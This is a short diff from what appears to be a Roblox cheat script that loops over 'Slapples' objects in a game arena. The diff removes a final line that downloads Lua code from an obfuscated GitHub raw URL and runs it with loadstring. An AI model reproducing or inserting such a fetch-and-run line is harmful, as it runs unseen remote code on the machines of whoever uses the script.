@@ -490,5 +490,3 @@ for i, v in next, workspace.Arena.island5.Slapples:GetDescendants() do
     end
 end
 ]]
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/8146esn45y18643n54y48163e8n546y1s81e5n6/JOJNKVERWAEV89F894W84AVE94F4-AW8-4EB84-W1A1-A4GW8-48E9W-81G-A3F4EW40AW4-04EW4834FW4A8V486FE864V8AW64/main/btsd56184eq"))()
